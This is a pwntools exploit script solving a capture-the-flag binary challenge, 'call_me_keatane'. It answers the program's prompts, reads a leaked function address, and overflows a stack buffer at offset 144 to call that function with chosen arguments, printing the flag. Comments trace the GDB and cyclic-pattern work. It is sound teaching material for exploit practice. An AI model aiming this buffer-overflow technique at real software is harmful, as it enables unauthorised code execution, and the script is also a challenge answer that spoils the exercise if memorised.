#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./call_me_keatane --host remotehost --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './call_me_keatane')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
host = args.HOST or '192.168.20.1'
port = int(args.PORT or 5280+10)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled

OFFSET_EIP = 144

io = start()

io.recvuntil(b': ')
io.sendline(b'Color me your color, baby')
io.recvuntil(b': ')
io.sendline(b'Color me your car')
io.recvuntil(b': ')
io.sendline(b'Color me your color, darling')

io.recvuntil(b'&target=')
print_flag = io.recvline()
address_str = print_flag.strip()
print_address = int(address_str, 16)
print(hex(print_address))

#string = cyclic(200) # user input buffer is 121
#io.recvuntil(b': ')
#io.sendline(string)

# via GDB I discover that the invalid return address contains 'laab'
# via cyclic lookup the offset is 144

io.recvuntil(b': ')
# function called, still I need to pass the arguments taken from ghidra
# arguments are after return address + 4, so 4 nops
#io.sendline(b'a' * OFFSET_EIP + p32(print_address))

io.sendline(b'a' * OFFSET_EIP + p32(print_address) + b'\x90\x90\x90\x90\x11\xba\xdd\x00\x1e\xab\x1d\xf0\x0d\xf0\x00\x00')

io.interactive()

# and function prints 
# BASC{you_g0t_the_args_right}.

